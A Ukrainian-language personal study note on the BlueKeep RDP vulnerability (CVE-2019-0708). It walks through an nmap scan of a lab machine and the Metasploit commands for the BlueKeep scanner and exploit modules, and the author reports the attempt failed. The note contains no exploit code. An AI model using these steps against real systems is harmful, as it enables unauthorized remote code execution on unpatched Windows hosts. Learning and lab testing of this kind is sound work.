---
title: "вразливість Windows--- Bluekeep and EnternalBlue"
category: "pentesting"
tags: ['blue', 'експлойт', 'eternalblue', 'вразливість', 'attack']
status: "published"
created: "2026-03-24"
updated: "2026-03-24"
ai-processed: false
source: "manual"
quality: 1
related-files: []
---

﻿1  ----------
2 Звязки :  [[вразливості Windows]] , [[Eternal Blue Attack  (eternalblue)]], [[Double pulsar Attack -експлойт Windows]]
3 Теги : [[вразливість Windows--- Bluekeep and EnternalBlue]]
появилась вразливість в 2019 році

це вразливість протоколу робочого стола RDP -
дає можливість запускати код навіть без автоінтефікації 
цілями є машини з ос до віндовс7
використовує порт **3389** він використовується на корпоративних машинах ф тут його потрібно включити. 
## включити порт 3389
якщо провести [[сканування]] портів машини віндовс :
sudo [[nmap]] -sS 192.168.1.77 
то порт 3389 не знаходжу
для вивчення атаки я мушу відкрити цей порт на працюючій машині віндовс7:
- заходжу на робочий стіл і відкриваю вкладку System and Security  -> System -> Remote setings (налаштування віддаленого доступу)
я не можу включити порт. можливо закрита можливість, бо компютер домашній, а цей порт використовується в корпоративних версіях
якщо найду відкритий порт то продовжую:
-заходжу в термінал метасполоіта в іншомму терміналі:
msfconsole
і взнаємо чи має вразливість ціль не використовуючи її (ми вводимо назву експлойту який буде використовувати оболонку інтерпретатора):
search blukeep
і отримую **допоміжний модуль** :
 0 auxiliary/scanner/rdp/cve_2019_0708_bluekeep                        2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
і **експлоіт** : 
 3   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
-насамперед використовуємо допоміжний модуль:
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep 
дивимось інформацію :
show info
дивлюся варіанти:
show options
установлюю RHOSTS
set RHOSTS 192.168.1.89
 і запускаю:
 run
 бачимо що ціль вразлива( в мене не получилось бо не так налаштована віндовс)
 тоді можна використати експлоіт для отримання доступу до цілі.:
 use exploit/windows/rdp/cve_2019_0708_bluekeep_rce



кіно тут:
https://www.youtube.com/watch?v=XQ0CL3LJ29E&list=PLrNhNTukZ_nF4GlvuniZJGC5cdfYDI0z7&index=57